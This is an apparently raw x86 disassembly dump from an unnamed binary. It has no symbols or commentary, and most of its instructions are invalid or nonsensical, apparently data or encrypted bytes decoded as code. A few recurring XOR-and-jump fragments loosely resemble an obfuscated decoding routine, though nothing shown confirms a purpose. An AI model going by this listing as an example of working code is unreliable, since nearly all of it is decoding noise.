  407a7d:	addr16 mov ebp,0xaa02c02a
  407a83:	inc    esp
  407a84:	add    BYTE PTR [eax],al
  407a86:	mov    ebx,0x3d000000
  407a8b:	mov    bh,0xdc
  407a8d:	xchg   bh,cl
  407a8f:	shl    DWORD PTR [ebp+0x64cc3594],1
  407a95:	jge    0x407ac3
  407a97:	mov    bl,0x25
  407a99:	mov    esp,0xf8e11636
  407a9e:	dec    esp
  407a9f:	daa    
  407aa0:	test   DWORD PTR [ebx+edx*1+0x50],0x2780f2d8
  407aa8:	adc    al,0x90
  407aaa:	sbb    eax,0xb07f8803
  407aaf:	cmp    dh,BYTE PTR ds:0x1de80a8
  407ab5:	xchg   DWORD PTR [eax],ebx
  407ab7:	mov    eax,0x93ec803a
  407abc:	pop    eax
  407abd:	or     ah,BYTE PTR [esi+0x30787511]
  407ac3:	xor    BYTE PTR [edx+0x4b948a04],0xb2
  407aca:	int    0x21
  407acc:	sbb    ecx,esi
  407ace:	int3   
  407acf:	and    esp,ebx
  407ad1:	std    
  407ad2:	js     0x407a96
  407ad4:	mov    dh,0xc1
  407ad6:	retf   0xed37
  407ad9:	or     esi,edx
  407adb:	std    
  407adc:	push   eax
  407add:	rcr    DWORD PTR [esi+ebx*1+0x29],0x59
  407ae2:	in     eax,0x2b
  407ae4:	mov    al,0xef
  407ae6:	mov    esi,0xc9b88353
  407aeb:	xor    BYTE PTR ds:0xf978f42a,ah
  407af1:	retf   0x53f9
  407af4:	out    0x84,eax
  407af6:	mov    ebp,DWORD PTR [edi+0x29717e55]
  407afc:	mov    al,ds:0x14119165
  407b01:	std    
  407b02:	dec    edi
  407b03:	stos   DWORD PTR es:[edi],eax
  407b04:	add    dl,cl
  407b06:	mov    eax,ds:0xe7ada63c
  407b0b:	push   edi
  407b0c:	outs   dx,DWORD PTR ds:[esi]
  407b0d:	and    DWORD PTR cs:[esi],ecx
  407b10:	dec    esp
  407b11:	lock mov BYTE PTR es:[esi],dl
  407b15:	int    0x4a
  407b17:	fcom   st(6)
  407b19:	adc    dl,ah
  407b1b:	ffree  st(5)
  407b1d:	add    BYTE PTR [eax],al
  407b1f:	add    DWORD PTR ds:0xa5fd145d,ebx
  407b25:	cmp    edx,DWORD PTR [esi+0x1b]
  407b28:	mov    esp,0x4b5089c7
  407b2d:	add    eax,0xf8e77490
  407b32:	push   es
  407b33:	stos   DWORD PTR es:[edi],eax
  407b34:	xchg   edx,eax
  407b35:	fwait
  407b36:	xchg   ecx,eax
  407b37:	push   0xffffff9e
  407b39:	inc    edx
  407b3a:	fist   DWORD PTR [eax+ebx*4+0x24]
  407b3e:	push   esp
  407b3f:	repnz fisttp WORD PTR [ecx+ebp*4]
  407b43:	rcl    dl,1
  407b45:	xor    edx,ebx
  407b47:	mov    DWORD PTR [ebp+0x1c],edx
  407b4a:	mov    edx,DWORD PTR [edi]
  407b4c:	mov    DWORD PTR [ebp+0x8],edx
  407b4f:	mov    edx,DWORD PTR [edi+0x4]
  407b52:	xor    eax,esi
  407b54:	mov    DWORD PTR [ebp+0xc],edx
  407b57:	cmp    eax,DWORD PTR [ebp+0x8]
  407b5a:	jmp    0x407c32
  407b5f:	in     eax,dx
  407b60:	call   0x7e15d03a
  407b65:	in     eax,dx
  407b66:	stc    
  407b67:	ja     0x407b81
  407b69:	push   ebp
  407b6a:	aas    
  407b6b:	xchg   edx,eax
  407b6c:	int3   
  407b6d:	add    ebx,DWORD PTR [edi+0x65]
  407b70:	inc    ebp
  407b71:	add    BYTE PTR [eax],al
  407b73:	mov    ebx,0x9f000000
  407b78:	push   esp
  407b79:	sbb    dh,cl
  407b7b:	push   DWORD PTR [esi-0xb]
  407b7e:	iret   
  407b7f:	jne    0x407bb6
  407b81:	xchg   ebx,eax
  407b82:	out    0x84,eax
  407b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b85:	push   esp
  407b86:	outs   dx,DWORD PTR ds:[esi]
  407b87:	outs   dx,BYTE PTR ds:[esi]
  407b88:	mul    BYTE PTR [ecx+eax*8+0x9c9ed7f]
  407b8f:	std    
  407b90:	and    ecx,DWORD PTR [ebp+0x30672ff4]
  407b96:	dec    esi
  407b97:	into   
  407b98:	(bad)  
  407b99:	jno    0x407b96
  407b9b:	mov    ebp,0x8cfd6224
  407ba0:	fistp  WORD PTR [eax+esi*4]
  407ba3:	loopne 0x407b5b
  407ba5:	cmc    
  407ba6:	jge    0x407b90
  407ba8:	sahf   
  407ba9:	push   eax
  407baa:	xor    DWORD PTR [ebp+0x61257e51],esp
  407bb0:	and    eax,0x46fade4c
  407bb5:	daa    
  407bb6:	adc    eax,0x75264dc2
  407bbb:	adc    DWORD PTR [ecx+0x4a79cdb7],0xbcc4687c
  407bc5:	add    ch,BYTE PTR [esi+eax*8]
  407bc8:	std    
  407bc9:	pop    ss
  407bca:	sub    bh,ch
  407bcc:	es hlt 
  407bce:	(bad)  
  407bcf:	(bad)  [ecx+0x4f2ef6fa]
  407bd5:	add    al,0xb1
  407bd7:	jl     0x407b84
  407bd9:	pop    eax
  407bda:	fiadd  DWORD PTR [edi-0x71b47516]
  407be0:	and    DWORD PTR [ebx],edi
  407be2:	addr16 cld 
  407be4:	jge    0x407bb7
  407be6:	leave  
  407be7:	push   ebp
  407be8:	sbb    eax,0x6d1339a0
  407bed:	mov    ah,0xfb
  407bef:	aad    0xca
  407bf1:	jo     0x407c68
  407bf3:	ffree  st(0)
  407bf5:	je     0x407c3b
  407bf7:	or     eax,0xfbfdf052
  407bfc:	sub    eax,0x6f798bae
  407c01:	pop    edi
  407c02:	fmul   QWORD PTR [edx]
  407c04:	in     al,dx
  407c05:	mov    eax,0xa30c97
  407c0a:	sub    DWORD PTR [ebx],esi
  407c0c:	xchg   DWORD PTR [edi+0x5c8ec6bf],ebx
  407c12:	jnp    0x407bd3
  407c14:	stc    
  407c15:	rcr    DWORD PTR [edi],cl
  407c17:	or     al,0x99
  407c19:	xor    DWORD PTR [edx+0x4],eax
  407c1c:	mov    esp,0xa1339211
  407c21:	out    dx,al
  407c22:	retf   0xaa7
  407c25:	cmp    eax,0xe251856b
  407c2a:	inc    ebx
  407c2b:	sbb    ebp,ecx
  407c2d:	adc    bh,BYTE PTR [ebp-0x32]
  407c30:	cs jmp 0x407c42
  407c33:	test   esp,eax
  407c35:	or     BYTE PTR [eax],al
  407c37:	add    BYTE PTR [ebx+0xd3e9c2],cl
  407c3d:	add    BYTE PTR [eax],al
  407c3f:	sub    eax,0x6fd76f2f
  407c44:	xlat   BYTE PTR ds:[ebx]
  407c45:	mov    ebp,0x277174ff
  407c4a:	pop    edi
  407c4b:	scas   eax,DWORD PTR es:[edi]
  407c4c:	sti    
  407c4d:	daa    
  407c4e:	jp     0x407c70
  407c50:	inc    esi
  407c51:	add    BYTE PTR [eax],al
  407c53:	mov    ebx,0x8a000000
  407c58:	jmp    0x407c70
  407c5a:	lahf   
  407c5b:	cmp    edx,DWORD PTR [edi]
  407c5d:	pop    ss
  407c5e:	push   ebp
  407c5f:	test   DWORD PTR [esp+ecx*8+0x2cfc4c9a],esi
  407c66:	in     al,0xb9
  407c68:	clc    
  407c69:	add    al,0x2d
  407c6b:	ins    DWORD PTR es:[edi],dx
  407c6c:	test   BYTE PTR [edi+0x5ef7389e],ah
  407c72:	cmp    ch,BYTE PTR [ecx+eax*2-0x44]
  407c76:	pop    es
  407c77:	cmp    al,0x3d
  407c79:	cmp    esp,DWORD PTR [edi-0x2d829f78]
  407c7f:	inc    ecx
  407c80:	adc    edi,ecx
  407c82:	adc    ebp,DWORD PTR [edi-0x47]
  407c85:	lods   eax,DWORD PTR ds:[esi]
  407c86:	std    
  407c87:	inc    eax
  407c88:	les    esi,FWORD PTR [edx-0xb]
  407c8b:	inc    esp
  407c8c:	inc    esp
  407c8d:	inc    ecx
  407c8e:	pop    edi
  407c8f:	in     eax,dx
  407c90:	cdq    
  407c91:	pushf  
  407c92:	stc    
  407c93:	sub    al,0x49
  407c95:	cmp    edi,esi
  407c97:	aad    0x1d
  407c99:	enter  0xea2f,0xa7
  407c9d:	jnp    0x407cdc
  407c9f:	dec    edi
  407ca0:	push   ebp
  407ca1:	ror    DWORD PTR [ecx],0xae
  407ca4:	cs xchg ebx,eax
  407ca6:	scas   al,BYTE PTR es:[edi]
  407ca7:	retf   0xb042
  407caa:	shl    DWORD PTR [edx-0xb],1
  407cad:	mov    ds:0xd283b053,al
  407cb2:	or     ah,BYTE PTR ds:[ecx]
  407cb5:	adc    al,0x7b
  407cb7:	mov    bh,0x6f
  407cb9:	adc    ah,al
  407cbb:	add    ah,ch
  407cbd:	sbb    BYTE PTR [ebx+edx*4],ch
  407cc0:	retf   0xaa39
  407cc3:	fcom   st(5)
  407cc5:	add    ecx,esi
  407cc7:	(bad)  [ecx]
  407cc9:	or     DWORD PTR ds:0x13a7acb0,ebp
  407ccf:	loope  0x407c63
  407cd1:	ins    DWORD PTR es:[edi],dx
  407cd2:	arpl   WORD PTR [ebx],bp
  407cd4:	mov    WORD PTR [ebx+0x5a],?
  407cd7:	sbb    al,0x1
  407cd9:	cmp    eax,0xe77a5391
  407cde:	xor    BYTE PTR [ecx+0x3fc0f39a],al
  407ce4:	les    ecx,FWORD PTR [ecx+0x5a]
  407ce7:	cli    
  407ce8:	add    al,0xa0
  407cea:	pop    esi
  407ceb:	push   edi
  407cec:	sbb    DWORD PTR [esi+eiz*8+0x6e7f54b6],eax
  407cf3:	pop    ss
  407cf4:	sahf   
  407cf5:	jp     0x407cae
  407cf7:	rcl    BYTE PTR [edx-0x4a369612],0xe6
  407cfe:	sar    DWORD PTR [edi+ecx*2+0x72],cl
  407d02:	xchg   ebp,eax
  407d03:	ds pop ecx
  407d05:	in     al,dx
  407d06:	push   eax
  407d07:	sbb    DWORD PTR [edi+edi*8+0x53291a6],0x1f0f7e05
  407d12:	cmp    DWORD PTR [ebp+0x1c],eax
  407d15:	jne    0x4084fc
  407d1b:	mov    eax,DWORD PTR [edi]
  407d1d:	mov    edx,DWORD PTR [edi+0x4]
  407d20:	xor    eax,esi
  407d22:	xor    edx,ebx
  407d24:	jmp    0x407dfc
  407d29:	xor    ah,BYTE PTR [edi+0x4b]
  407d2c:	xor    al,0x5f
  407d2e:	cmp    al,0x7f
  407d30:	addr16 jmp 0x407cd7
  407d33:	xchg   edx,eax
  407d34:	dec    esi
  407d35:	vsubss xmm3,xmm6,xmm2
  407d39:	fild   DWORD PTR [esi+0x0]
  407d3c:	add    BYTE PTR [ebx-0x20000000],bh
  407d42:	and    dh,al
  407d44:	dec    esp
  407d45:	adc    eax,0x91edf1f0
  407d4a:	mov    edi,0x677fd85b
  407d4f:	xchg   esi,eax
  407d50:	xor    al,0x58
  407d52:	popf   
  407d53:	or     DWORD PTR [ecx-0x480f49fe],ebp
  407d59:	cwde   
  407d5a:	mov    ds:0x3ce15c2c,eax
  407d5f:	jns    0x407dcb
  407d61:	sbb    al,0xf6
  407d63:	push   ecx
  407d64:	sbb    BYTE PTR [ecx],0x8
  407d67:	(bad)  
  407d68:	and    DWORD PTR [ebp-0x74],ebx
  407d6b:	sub    eax,0x6fa0d42b
  407d70:	addr16 push ebx
  407d72:	xchg   esi,eax
  407d73:	(bad)  
  407d74:	sub    al,0x7a
  407d76:	jge    0x407daf
  407d78:	fisttp WORD PTR [esi+0x6be4a982]
  407d7e:	or     eax,0x5c0505e1
  407d83:	xchg   edi,eax
  407d84:	or     cl,BYTE PTR [eax-0xaeda83d]
  407d8a:	sar    BYTE PTR [esi-0xa],cl
  407d8d:	pop    esp
  407d8e:	add    al,0xfd
  407d90:	sbb    BYTE PTR [ebx+0x30],0xf2
  407d94:	cld    
  407d95:	inc    edx
  407d96:	jp     0x407ddc
  407d98:	push   ecx
  407d99:	push   0x68a8814c
  407d9e:	mov    ah,0xa
  407da0:	cmp    al,0x48
  407da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da4:	(bad)  
  407da5:	jbe    0x407dfd
  407da7:	mov    esp,0x53aaa836
  407dac:	xlat   BYTE PTR ds:[ebx]
  407dad:	dec    ecx
  407dae:	jb     0x407df4
  407db0:	mov    ecx,edi
  407db2:	retf   
  407db3:	mov    ebp,0xa66a5612
  407db8:	fisttp WORD PTR [esi+0x651a2416]
  407dbe:	jl     0x407d6c
  407dc0:	mov    eax,ds:0x83c254b1
  407dc5:	pop    esp
  407dc6:	scas   eax,DWORD PTR es:[edi]
  407dc7:	mov    dh,0xf4
  407dc9:	frstor [edi+0x16]
  407dcc:	pop    ebp
  407dcd:	imul   ecx,DWORD PTR ds:0xfc3f93bc,0xc59dc950
  407dd7:	and    al,0xf4
  407dd9:	aaa    
  407dda:	std    
  407ddb:	scas   eax,DWORD PTR es:[edi]
  407ddc:	stc    
  407ddd:	add    edi,DWORD PTR [ebx-0x70]
  407de0:	cld    
  407de1:	addr16 inc edi
  407de3:	pop    ds
  407de4:	pop    ebx
  407de5:	aam    0xdd
  407de7:	int    0x1b
  407de9:	add    ch,BYTE PTR [ecx+0x52]
  407dec:	and    ebp,ebp
  407dee:	cmp    ch,BYTE PTR [eax]
  407df0:	lock add BYTE PTR [eax],ah
  407df3:	pop    ss
  407df4:	adc    edx,DWORD PTR [esi+0x6f]
  407df7:	popa   
  407df8:	not    edx
  407dfa:	ins    BYTE PTR es:[edi],dx
  407dfb:	fadd   QWORD PTR ds:0x99b8624d
  407e01:	mov    DWORD PTR [ebp+0x8],eax
  407e04:	jmp    0x407edc
  407e09:	ss adc al,0x7a
  407e0c:	in     al,0x7a
  407e0e:	out    dx,al
  407e0f:	mov    esi,0x1b997bd6
  407e14:	dec    esi
  407e15:	cmp    esi,edi
  407e17:	pusha  
  407e18:	int    0x96
  407e1a:	inc    edi
  407e1b:	add    BYTE PTR [eax],al
  407e1d:	mov    ebx,0xe8000000
  407e22:	outs   dx,BYTE PTR ds:[esi]
  407e23:	sahf   
  407e24:	popa   
  407e25:	xchg   dl,ah
  407e27:	sbb    eax,0x912fe965
  407e2c:	or     eax,0x28e7ba5f
  407e31:	mov    ecx,0xcf8a6c15
  407e36:	int3   
  407e37:	(bad)  [esi+0x16f855b6]
  407e3d:	lea    esi,[esi]
  407e3f:	push   ss
  407e40:	pop    ecx
  407e41:	call   0x742b61f0
  407e46:	mov    ds:0xc0947efe,al
  407e4b:	or     edi,edx
  407e4d:	mov    dh,0xe3
  407e4f:	mov    ebx,0xe4f250a1
  407e54:	fwait
  407e55:	jmp    0x407e8a
  407e57:	je     0x407ec8
  407e59:	(bad)  
  407e5a:	and    al,BYTE PTR [edx+ebx*1+0x1b203fbf]
  407e61:	je     0x407df7
  407e63:	loopne 0x407e19
  407e65:	into   
  407e66:	test   al,0x89
  407e68:	in     eax,0xbd
  407e6a:	cld    
  407e6b:	test   eax,0xf9d60df
  407e70:	pop    eax
  407e71:	pop    edx
  407e72:	inc    eax
  407e73:	cmp    al,0xc5
  407e75:	pop    es
  407e76:	xchg   ecx,eax
  407e77:	and    esi,DWORD PTR [edi]
  407e79:	cld    
  407e7a:	call   0xac7ba6c2
  407e7f:	mov    esi,0x5b2ac686
  407e84:	jns    0x407ed4
  407e86:	xor    al,0xae
  407e88:	icebp  
  407e89:	cs jns 0x407e9a
  407e8c:	mov    bl,0xd7
  407e8e:	add    al,0x63
  407e90:	lds    esp,FWORD PTR [ecx+0x24]
  407e93:	mov    sp,WORD PTR [esi]
  407e96:	lea    ebp,[ebx-0x6a]
  407e99:	jle    0x407e25
  407e9b:	stos   BYTE PTR es:[edi],al
  407e9c:	iret   
  407e9d:	xchg   DWORD PTR [eax],edx
  407e9f:	lods   al,BYTE PTR ds:[esi]
  407ea0:	out    dx,al
  407ea1:	sub    al,0xdd
  407ea3:	mov    edi,0x93a2873e
  407ea8:	fnstsw WORD PTR [edi+0x4]
  407eab:	fcom   QWORD PTR [esi-0x5a]
  407eae:	(bad)  
  407eaf:	xor    edi,ecx
  407eb1:	mov    ecx,0xd7752c8b
  407eb6:	sub    eax,0x12beeb3
  407ebb:	addr16 (bad) 
  407ebd:	mov    ah,al
  407ebf:	add    BYTE PTR [edi],0x9f
  407ec2:	xor    BYTE PTR [edx+0x790ce0c0],al
  407ec8:	std    
  407ec9:	mov    ebp,0xd10cff2b
  407ece:	add    al,0xec
  407ed0:	je     0x407f11
  407ed2:	inc    ebp
  407ed3:	sahf   
  407ed4:	pop    es
  407ed5:	xlat   BYTE PTR ds:[ebx]
  407ed6:	addr16 dec ecx
  407ed8:	xlat   BYTE PTR ds:[ebx]
  407ed9:	enter  0x4e0b,0x8b
  407edd:	ret    0x118b
  407ee0:	mov    ecx,DWORD PTR [ecx+0x4]
  407ee3:	jmp    0x407fbb
  407ee8:	and    eax,0x7d351d48
  407eed:	jne    0x407f1c
  407eef:	pop    eax
  407ef0:	mov    bl,0xd8
  407ef2:	and    DWORD PTR [edi],edi
  407ef4:	xor    DWORD PTR [eax+0x2d],esi
  407ef7:	addr16 push ecx
  407ef9:	dec    eax
  407efa:	add    BYTE PTR [eax],al
  407efc:	mov    ebx,0x21000000
  407f01:	xlat   BYTE PTR ds:[ebx]
  407f02:	call   0xa0cfcbce
  407f07:	dec    ebx
  407f08:	jmp    0xde29943c
  407f0d:	(bad)  
  407f0e:	retf   
  407f0f:	cwde   
  407f10:	gs dec ebx
  407f12:	jns    0x407ec6
  407f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f15:	inc    edi
  407f16:	mov    ah,0xc6
  407f18:	adc    eax,0x4705c37d
  407f1d:	ret    0x91e7
  407f20:	or     BYTE PTR [edx+ebp*2],bh
  407f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f24:	seta   BYTE PTR [edx+0x5a]
  407f28:	mov    cl,0x9b
  407f2a:	adc    DWORD PTR [edx],ecx
  407f2c:	or     DWORD PTR [edx+0x5c51ca4f],eax
  407f32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f33:	call   0x6e63:0x33c57e38
  407f3a:	dec    esi
  407f3b:	retf   
  407f3c:	test   bl,al
  407f3e:	nop
  407f3f:	fwait
  407f40:	aam    0x28
  407f42:	sbb    eax,0xfbde8ab4
  407f47:	in     al,dx
  407f48:	iret   
  407f49:	retf   0x2235
  407f4c:	mov    bh,0x6e
  407f4e:	jmp    0x3def3eb5
  407f53:	push   ecx
  407f54:	push   esp
  407f55:	mov    esi,0x41297b35
  407f5a:	xlat   BYTE PTR ds:[ebx]
  407f5b:	call   0x54b8c179
  407f60:	fnstsw WORD PTR [ebx+0x5dfa3cfd]
  407f66:	test   eax,0x410f6a14
  407f6b:	mov    eax,0x540be4df
  407f70:	cdq    
  407f71:	stc    
  407f72:	mov    edx,0xf3f34044
  407f77:	lods   al,BYTE PTR ds:[esi]
  407f78:	jge    0x407f53
  407f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7b:	xchg   BYTE PTR [eax-0x4afa820b],bh
  407f81:	out    dx,al
  407f82:	test   eax,0x4bcbc8a0
  407f87:	rcl    BYTE PTR [esi-0x73],1
  407f8a:	and    DWORD PTR [esi],edi
  407f8c:	aaa    
  407f8d:	cmp    dh,BYTE PTR [eax+eiz*8-0x4be674ed]
  407f94:	cmp    ah,bh
  407f96:	pop    ebx
  407f97:	mov    ah,0x1b
  407f99:	cdq    
  407f9a:	mov    eax,ds:0x11686b9c
  407f9f:	or     bh,dl
  407fa1:	sub    eax,0x7cf039fb
  407fa6:	cmp    DWORD PTR [edi],edx
  407fa8:	mov    ds:0x23603980,eax
  407fad:	xor    esi,0x1293f4a
  407fb3:	dec    BYTE PTR [ebx+0x20]
  407fb6:	(bad)  
  407fb8:	mov    esp,0xdc15b246
  407fbd:	lea    eax,[eax]
  407fbf:	add    BYTE PTR [eax-0x17],dl
  407fc2:	rol    DWORD PTR [eax],cl
  407fc4:	add    BYTE PTR [eax],al
  407fc6:	sbb    eax,0x9d909c94
  407fcb:	cwde   
  407fcc:	sbb    eax,0x7120f09d
  407fd1:	mov    eax,ds:0xccaeba80
  407fd6:	or     al,0x49
  407fd8:	add    BYTE PTR [eax],al
  407fda:	mov    ebx,0xa2000000
  407fdf:	pop    ebx
  407fe0:	(bad)  
  407fe1:	xor    eax,0x81232adc
  407fe6:	pop    ecx
  407fe7:	sbb    eax,DWORD PTR [edi+0x42]
  407fea:	xor    esi,ebx
  407fec:	sar    DWORD PTR [edi+0x39],cl
  407fef:	test   BYTE PTR [edx],cl
  407ff1:	cld    
  407ff2:	jp     0x407fe4
  407ff4:	adc    BYTE PTR [edi+0x4a],cl
  407ff7:	retf   
  407ff8:	mov    edx,0x616858bf
  407ffd:	sub    cl,BYTE PTR ds:0xecaeb773
  408003:	fsub   st,st(3)
  408005:	push   ebp
  408006:	test   al,0x27
  408008:	ins    DWORD PTR es:[edi],dx
  408009:	ins    DWORD PTR es:[edi],dx
  40800a:	int3   
  40800b:	sub    ch,BYTE PTR [ebp+0x481ede4a]
  408011:	inc    esp
  408012:	push   es
  408013:	pop    ebx
  408014:	repnz jmp 0x359f:0x39c004d0
  40801c:	dec    eax
  40801d:	mov    eax,ds:0x2018e303
  408022:	call   0x16da:0x10eeed70
  408029:	add    edx,ecx
  40802b:	mov    DWORD PTR [esi-0x2d927a7e],0xbc77114a
  408035:	mov    edx,0x2153b0d4
  40803a:	xchg   bl,ah
  40803c:	adc    DWORD PTR [esi-0x80],0x8cb4ffbf
  408043:	mov    bh,0xa2
  408045:	cmp    esi,edx
  408047:	jmp    0xad417d8a
  40804c:	int3   
  40804d:	add    dl,BYTE PTR [ebp+0x57]
  408050:	add    ebx,DWORD PTR [esi+0xca6cc78]
  408056:	xor    BYTE PTR [edx-0x7e445b9f],bh
  40805c:	rep outs dx,BYTE PTR ds:[esi]
  40805e:	dec    ebp
  40805f:	add    al,0x9b
  408062:	adc    DWORD PTR [ebx],eax
  408064:	inc    esp
  408065:	mov    ds:0xf60c4c70,eax
  40806a:	pop    ebx
  40806b:	lahf   
  40806c:	test   DWORD PTR [edx-0x40358bac],edx
  408072:	retf   
  408073:	and    DWORD PTR [ebx-0x7b8250e2],ebx
  408079:	inc    edx
  40807a:	aas    
  40807b:	or     ah,BYTE PTR [ebp-0x65]
  40807e:	xor    bh,bh
  408080:	jmp    0x853d:0x6ff54002
  408087:	js     0x408106
  408089:	pop    ds
  40808a:	jbe    0x40807d
  40808c:	mov    ds:0x6bee4f7f,al
  408091:	mov    dl,0x72
  408093:	add    BYTE PTR [eax+0x6a],0x7c
  408097:	pop    es
  408098:	pop    edi
  408099:	push   DWORD PTR [ebp+0x8]
  40809c:	push   ecx
  40809d:	jmp    0x408175
  4080a2:	cmp    bl,BYTE PTR es:[eax+0x77ef9ccd]
  4080a9:	sti    
  4080aa:	sbb    ebx,DWORD PTR [ecx-0x1cee6d8c]
  4080b0:	loop   0x40806e
  4080b2:	(bad)  
  4080b3:	dec    ecx
  4080b4:	add    BYTE PTR [eax],al
  4080b6:	mov    ebx,0x62000000
  4080bb:	lods   al,BYTE PTR ds:[esi]
  4080bc:	arpl   cx,sp
  4080be:	push   0xeb867d83
  4080c3:	test   al,0x95
  4080c5:	(bad)  
  4080c6:	xor    edi,edi
  4080c8:	cmp    BYTE PTR [ebp+0x47e3e8cf],al
  4080ce:	fisttp QWORD PTR [esi]
  4080d0:	adc    eax,0xdcb1232c
  4080d5:	add    eax,0x2afec4ca
  4080da:	adc    bl,BYTE PTR [ebx]
  4080dc:	std    
  4080dd:	xchg   DWORD PTR [ebx+eax*4-0x25],ebx
  4080e1:	dec    ebx
  4080e2:	inc    esp
  4080e3:	cs repz cmp eax,0xcdd164e0
  4080ea:	push   ecx
  4080eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080ec:	std    
  4080ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ee:	inc    ecx
  4080ef:	mov    ecx,0x8ae27be4
  4080f4:	les    esi,FWORD PTR [ebp+eax*8+0x302c25d1]
  4080fb:	imul   eax,ebp,0x5aae8bf3
  408101:	xlat   BYTE PTR ds:[ebx]
  408102:	mov    al,fs:0xdf96035b
  408108:	xlat   BYTE PTR ds:[ebx]
  408109:	mov    esp,0x4d62ec59
  40810e:	mov    DWORD PTR [eax-0x6b0db86b],ebp
  408114:	jmp    0x9cee:0xcd576d13
  40811b:	adc    eax,0x27d0673d
  408120:	aas    
  408121:	push   edi
  408122:	push   ebx
  408123:	xor    esi,ecx
  408125:	ins    BYTE PTR es:[edi],dx
  408126:	je     0x408153
  408128:	mov    cl,cl
  40812a:	cdq    
  40812b:	retf   
  40812c:	pusha  
  40812d:	loope  0x408121
  40812f:	outs   dx,DWORD PTR ds:[esi]
  408130:	pop    esp
  408131:	fisttp QWORD PTR [ecx]
  408133:	mov    bh,0xc8
  408135:	pusha  
  408136:	ja     0x408193
  408138:	mov    al,0x4e
  40813a:	rcr    BYTE PTR [esi],cl
  40813c:	rol    BYTE PTR [edx+ebp*2-0xb0905e2],0xd9
  408144:	jbe    0x408172
  408146:	outs   dx,DWORD PTR ds:[esi]
  408147:	test   al,0xdd
  408149:	jle    0x40810f
  40814b:	xchg   ebp,eax
  40814c:	aaa    
  40814d:	ins    DWORD PTR es:[edi],dx
  40814e:	mov    ah,0x1d
  408150:	fcomp  st(4)
  408152:	cmp    al,0x10
  408154:	and    DWORD PTR [eax],ebx
  408156:	xchg   esp,eax
  408157:	cmp    DWORD PTR [ebx+ebp*1-0x53],ebp
  40815b:	aas    
  40815c:	sar    DWORD PTR [ebx],1
  40815e:	das    
  40815f:	mov    ?,WORD PTR [edi-0x4aad45a6]
  408165:	in     eax,0x75
  408167:	aas    
  408168:	dec    edx
  408169:	rol    edi,0xb7
  40816c:	popf   
  40816d:	int    0xe2
  40816f:	add    edi,ecx
  408171:	arpl   WORD PTR [ecx],bp
  408173:	ins    DWORD PTR es:[edi],dx
  408174:	dec    ecx
  408175:	push   edx
  408176:	call   0x42a3cf
  40817b:	jmp    0x408253
  408180:	stos   BYTE PTR es:[edi],al
  408181:	mov    dh,0x72
  408183:	in     al,0x7e
  408185:	in     al,0xbe
  408187:	(bad)  
  408188:	fisttp WORD PTR [ebp-0xf]
  40818b:	ficomp WORD PTR [esi+0x5]
  40818e:	jno    0x4081c3
  408190:	or     BYTE PTR [edx+0x0],0x0
  408194:	mov    ebx,0xae000000
  408199:	inc    ecx
  40819a:	mov    eax,ds:0x53b8bf74
  40819f:	imul   edi,DWORD PTR [eax+0x683e3e69],0xc1e058b8
  4081a9:	(bad)  
  4081aa:	fldcw  WORD PTR [edx]
  4081ac:	pop    ds
  4081ad:	xchg   ebx,eax
  4081ae:	in     al,0x9b
  4081b0:	stos   BYTE PTR es:[edi],al
  4081b1:	sti    
  4081b2:	mov    al,0x3b
  4081b4:	mov    eax,ds:0x1c1be29a
  4081b9:	js     0x4081e9
  4081bb:	scas   eax,DWORD PTR es:[edi]
  4081bc:	add    al,0x2f
  4081be:	adc    ah,BYTE PTR [ebp-0x44]
  4081c1:	ret    0xc6e0
  4081c4:	jo     0x4081f7
  4081c6:	clc    
  4081c7:	pushf  
  4081c8:	xor    al,0xfd
  4081ca:	loopne 0x40822a
  4081cc:	pop    ebx
  4081cd:	retf   0xc2de
  4081d0:	(bad)  
  4081d1:	iret   
  4081d2:	xchg   ebx,eax
  4081d3:	retf   0x7df6
  4081d6:	lock fs inc esp
  4081d9:	mov    ebp,0xdbfb3393
  4081de:	int3   
  4081df:	mov    DWORD PTR [eax+0x45],esi
  4081e2:	mov    esi,0xeecd0ca2
  4081e7:	cmp    al,0x1e
  4081e9:	inc    esp
  4081ea:	shr    dl,1
  4081ec:	cmp    BYTE PTR [esi-0x38],bh
  4081ef:	xor    DWORD PTR [ebx-0x7a109f2f],eax
  4081f5:	mov    BYTE PTR [ecx-0x7d873fb3],al
  4081fb:	(bad)  
  4081fc:	hlt    
  4081fd:	push   edx
  4081fe:	mov    ds:0x66dea37b,al
  408203:	mov    bl,0x9b
  408205:	(bad)  
  408206:	sub    eax,0x3fb6b975
  40820b:	dec    ebx
  40820c:	clc    
  40820d:	and    BYTE PTR [ebx+0xd],cl
  408210:	jo     0x40824e
  408212:	cld    
  408213:	into   
  408214:	es popa 
  408216:	inc    esi
  408217:	loop   0x4081c0
  408219:	jbe    0x4081b1
  40821b:	xchg   ecx,eax
  40821c:	cwde   
  40821d:	sahf   
  40821e:	push   0x35bc75d4
  408223:	lea    esi,[edi]
  408225:	out    0x97,eax
  408227:	adc    al,0xca
  408229:	add    ebx,DWORD PTR es:[eax+0x14459f8c]
  408230:	adc    ch,BYTE PTR [ebx-0x7f8d1e11]
  408236:	sub    dh,BYTE PTR [edx]
  408238:	lods   eax,DWORD PTR ds:[esi]
  408239:	jae    0x40821d
  40823b:	cwde   
  40823c:	fiadd  DWORD PTR [eax]
  40823e:	xlat   BYTE PTR ds:[ebx]
  40823f:	(bad)  
  408240:	add    cl,cl
  408242:	or     bh,BYTE PTR fs:[esi+0xe34e112]
  408249:	pop    ebp
  40824a:	jl     0x408290
  40824c:	mov    ax,cx
  40824f:	sub    eax,0x8b6470e1
  408254:	syscall 
  408256:	mov    bl,0x9d
  408258:	inc    edi
  408259:	jmpw   0x8330
  40825d:	add    BYTE PTR [eax],al
  40825f:	cwde   
  408260:	(bad)  
  408262:	jns    0x408239
  408264:	jns    0x408222
  408266:	std    
  408267:	xor    DWORD PTR [ecx+edx*2-0xc2ab1cd],edx
  40826e:	mov    eax,ds:0x4b3d
  408273:	mov    ebx,0x2e000000
  408278:	rcl    BYTE PTR [esi],0x90
  40827b:	enter  0x7ac7,0x85
  40827f:	push   ss
  408280:	push   eax
